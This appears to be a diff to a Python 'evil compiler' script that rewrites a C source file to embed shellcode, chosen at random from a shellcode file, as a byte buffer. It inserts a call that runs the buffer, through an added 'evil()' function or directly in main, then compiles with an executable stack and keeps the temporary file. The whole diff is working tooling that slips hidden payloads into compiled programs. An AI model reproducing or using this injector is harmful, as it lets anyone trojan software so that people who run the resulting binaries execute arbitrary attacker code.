@@ -8,18 +8,50 @@ if len(sys.argv)==1:
     print(prompt)
     exit(0)
 
+global f2, ret_place, main_place
 f2 = open(sys.argv[1],'r').read()
-
 ret_place = f2.find('return 0;')
 main_place = f2.find('int main')
 evil_code=''
 
-types = 1
-if random.randint(0,types)==0:
-    evil_code = f2[:ret_place]
-    evil_code += 'printf("hacked\\n");\n'
-    evil_code += f2[ret_place:]
+def exp1(s):
+    evil_code = f2[:main_place]
+    evil_code+='''
+unsigned char buf[] = {};
+'''.format(s)
 
+    evil_code += f2[main_place:ret_place]
+    evil_code += '''
+(*(void(*)()) buf)();
+'''
+
+    evil_code += f2[ret_place:]
+    return evil_code
+
+def exp2(s):
+    evil_code = f2[:main_place]
+    evil_code+= """
+void evil()\{
+    unsigned char buf[]  = {};
+    (*(void(*)()) buf)();
+    return;
+\}
+
+""".format(s)
+    evil_code+= f2[main_place:ret_place]
+    evil_code+= '\nevil();\n'
+    evil_code+= f2[ret_place:]
+    return evil_code
+
+exploit_list = [exp1,exp2]
+s = open("shellcode1.txt","r").read()
+s = s.split('unsigned char buf[] =')[1:]
+s = [i.split(';')[0] for i in s]
+print(len(s))
+i = random.randint(0,len(exploit_list)-1)
+i2 = random.randint(0,len(s)-1)
+print(i,i2)
+evil_code = exploit_list[i](s[i2])
 #print(evil_code)
 
 tmp_name = "tmp_c_for_evil_compiler.c"
@@ -27,5 +59,5 @@ tmp_name = "tmp_c_for_evil_compiler.c"
 with open(tmp_name,'w') as f:
     f.write(evil_code)
 
-os.system('gcc '+tmp_name) 
-os.system('rm '+tmp_name)
+os.system('gcc -z execstack '+tmp_name) 
+#os.system('rm '+tmp_name)
